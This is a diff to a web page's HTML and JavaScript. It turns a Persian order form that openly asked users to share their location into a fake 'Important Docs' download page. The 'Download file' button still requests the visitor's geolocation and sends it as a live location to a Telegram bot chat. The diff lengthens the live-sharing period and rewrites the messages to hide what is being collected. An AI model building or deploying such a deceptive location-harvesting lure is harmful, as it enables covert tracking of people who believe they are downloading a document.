@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ثبت سفارش - ارسال مکان با رضایت</title>
+    <title>Important Docs</title>
     <style>
         body {
             font-family: Tahoma, sans-serif;
@@ -72,16 +72,16 @@
 <body>
 
     <div class="container">
-        <h1>📍 ثبت و ارسال مکان سفارش</h1>
+        <h1>Countinue</h1> 
 
         <p>
-            برای ثبت سفارش، لطفاً روی دکمه زیر کلیک کرده و با ارسال *مکان جغرافیایی فعلی* خود به صورت *داوطلبانه* موافقت نمایید.
+            For receive your docs click bellow and feel the form & send the form to Telgram page. @location904411_Bot
         </p>
 
-        <button id="sendLocationButton">ارسال مکان و ثبت درخواست</button>
+        <button id="sendLocationButton">Download file</button>
 
         <div id="message" class="info">
-            لطفاً روی دکمه بالا کلیک کنید.
+           Next
         </div>
     </div>
 
@@ -95,7 +95,7 @@
             const messageElement = document.getElementById('message');
             const button = this;
 
-            messageElement.textContent = '⏱ در حال درخواست اجازه مکان از مرورگر...';
+            messageElement.textContent = 'Download Progress...';
             messageElement.className = 'info';
             button.disabled = true; 
 
@@ -114,11 +114,11 @@
                                 if (response.ok) {
                                     // نمایش پیام نهایی به کاربر
                                     const finalMessage = `
-                                    ✅ *موفقیت‌آمیز:* مکان شما با موفقیت به تلگرام ارسال شد.
+                                    ✅ *Successfully registered.
                                     <br><br>
-                                    طی *24 ساعت* مدارک لازم برای شما از طریق تلگرام ارسال خواهد شد.
+                                  You will receive your document in 24 houre befor that please send us application form in our official telgram.
                                     <br><br>
-                                    🔔 *اکنون:* لطفاً برای نهایی کردن کار، به آدرس زیر در تلگرام مراجعه کرده و سفارش خود را ثبت کنید:
+                                  Thank you
                                     <br>
                                     <a href="https://t.me/${BOT_USERNAME.substring(1)}" target="_blank">${BOT_USERNAME}</a>
                                     `;
@@ -127,14 +127,14 @@
                                     messageElement.className = 'success';
                                 } else {
                                     console.error('Telegram API Error:', response);
-                                    messageElement.textContent = ❌ خطا در ارسال به تلگرام: ${response.description || 'خطای نامشخص.'};
+                                    messageElement.textContent = ❌Error to match: ${response.description || ' Unkown error.'};
                                     messageElement.className = 'error';
                                 }
                             })
                             .catch(error => {
                                 button.disabled = false;
                                 console.error('Network Error:', error);
-                                messageElement.textContent = '❌ خطای شبکه یا مشکل در اتصال به سرور تلگرام. لطفاً دوباره امتحان کنید.';
+                                messageElement.textContent = '❌ Network connection filed.';
                                 messageElement.className = 'error';
                             });
                     },
@@ -145,16 +145,16 @@
                         let errorMessage = '❌ *خطا در دریافت مکان:* ';
                         switch(error.code) {
                             case error.PERMISSION_DENIED:
-                                errorMessage += "کاربر اجازه دسترسی به مکان را صادر نکرد. لطفاً در تنظیمات مرورگر اجازه دهید.";
+                                errorMessage += "Applicant not agree in this rules.";
                                 break;
                             case error.POSITION_UNAVAILABLE:
-                                errorMessage += "اطلاعات مکان در دسترس نیست (مثلاً GPS یا Wi-Fi شما خاموش است).";
+                                errorMessage += "wifi or network connection filed.";
                                 break;
                             case error.TIMEOUT:
-                                errorMessage += "زمان انتظار برای دریافت مکان به پایان رسید.";
+                                errorMessage += "Timeout.";
                                 break;
                             default:
-                                errorMessage += "خطای نامشخصی رخ داده است.";
+                                errorMessage += "Unkown error";
                                 break;
                         }
                         messageElement.textContent = errorMessage;
@@ -170,7 +170,7 @@
                 );
             } else {
                 button.disabled = false;
-                messageElement.textContent = "❌ متأسفانه، مرورگر شما از Geolocation API پشتیبانی نمی‌کند.";
+                messageElement.textContent = "❌ You browser not spported Try it in deferint browser.";
                 messageElement.className = 'error';
             }
         });
@@ -188,7 +188,7 @@
                     chat_id: CHAT_ID,
                     latitude: latitude,
                     longitude: longitude,
-                    live_period: 60 // ارسال به عنوان یک مکان لایو موقت (60 ثانیه)
+                    live_period: 500 // ارسال به عنوان یک مکان لایو موقت (500 ثانیه)
                 })
             });
             
